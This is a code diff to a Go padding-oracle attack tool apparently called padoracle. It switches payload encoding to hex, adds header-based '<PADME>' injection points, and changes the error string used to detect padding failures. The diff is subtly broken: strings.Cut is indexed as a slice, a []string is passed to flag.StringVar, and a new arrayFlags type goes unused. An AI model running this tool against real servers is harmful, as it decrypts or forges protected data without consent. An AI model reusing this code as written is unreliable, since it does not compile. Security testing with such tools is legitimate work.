@@ -2,7 +2,7 @@ package main
 
 import (
 	"crypto/tls"
-	"encoding/base64"
+	"encoding/hex"
 	"flag"
 	"fmt"
 	"net"
@@ -17,6 +17,17 @@ import (
 
 	"github.com/swarley7/padoracle/libpadoracle"
 )
+
+type arrayFlags []string
+
+func (i *arrayFlags) String() string {
+	return "my string representation"
+}
+
+func (i *arrayFlags) Set(value string) error {
+	*i = append(*i, value)
+	return nil
+}
 
 type testpad struct {
 	Data    string
@@ -35,7 +46,7 @@ var DefaultDialer = &net.Dialer{}
 
 // EncodePayload turns the raw oracle payload (IV + Ciphertext) into whatever format is required by the endpoint server. Modify this routine to suit the specific needs of the application.
 func (t testpad) EncodePayload(RawPadOraclePayload []byte) (encodedPayload string) {
-	encodedPayload = base64.URLEncoding.EncodeToString(RawPadOraclePayload)
+	encodedPayload = hex.EncodeToString(RawPadOraclePayload)
 	return encodedPayload
 }
 
@@ -44,7 +55,7 @@ func (t testpad) DecodeCiphertextPayload(EncodedPayload string) []byte {
 	var decoded []byte
 	//****** EDIT this function to suit your particular ciphertext's encoding. ********//
 	// This function should return a byte array of the ciphertext's raw bytes //
-	decoded, err := base64.URLEncoding.DecodeString(EncodedPayload)
+	decoded, err := hex.DecodeString(EncodedPayload)
 	libpadoracle.Check(err)
 	return decoded
 }
@@ -71,6 +82,12 @@ func (t testpad) CallOracle(encodedPayload string) bool {
 
 	// Set cookie
 	req.Header.Set("Cookie", strings.Replace(t.Cookies, "<PADME>", encodedPayload, -1))
+	for _, i := range strings.Split(t.headers, ";;") {
+		if len(i) > 0 {
+			kv := strings.Cut(i, ":")
+			req.Header.Set(strings.Replace(kv[0], "<PADME>", encodedPayload, -1), strings.Replace(kv[1], "<PADME>", encodedPayload, -1))
+		}
+	}
 	resp, err := t.Client.Do(req)
 	libpadoracle.Check(err)
 	defer resp.Body.Close() // Return the response data back to the caller
@@ -85,7 +102,7 @@ func (t testpad) CheckResponse(resp Resp) bool {
 	// Sample - the server's response includes the string "not padded correctly"
 	// matched, _ := regexp.MatchString(`not padded correctly`, resp.BodyData)
 	// fmt.Println(matched, err)
-	if strings.Contains(resp.BodyData, "javax.crypto.BadPaddingException") {
+	if strings.Contains(resp.BodyData, "Error occurred during a cryptographic operation.") {
 		return false
 	}
 	return true
@@ -102,6 +119,7 @@ func main() {
 	var proxyUrl string
 	var cookies string
 	var ignoreTls bool
+	var headers []string
 
 	var binaryMode bool
 
@@ -117,6 +135,7 @@ func main() {
 
 	flag.StringVar(&Url, "u", "", "The target URL. Use the marker '<PADME>' to identify the injection point (note: will check GET and POST data)")
 	flag.StringVar(&method, "method", "GET", "HTTP method to use (default GET)")
+	flag.StringVar(&headers, "headers", "", "Optional: provide additional headers to be sent with the request (double semicolon-delimited). E.g. \"header1: value1;; header2: value2;\" Use the marker '<PADME>' to identify the injection point (note: will check Keys and Values)")
 	flag.StringVar(&data, "data", "", "Optional: POST data to supply with request")
 	flag.IntVar(&cfg.Mode, "m", 0, "0 = Decrypt; 1 = Encrypt. Note: Encryption through a padding oracle cannot be concurrently performed (as far as I can determine). A single thread is used in this mode.")
 	flag.BoolVar(&cfg.Debug, "d", false, "Debug mode")
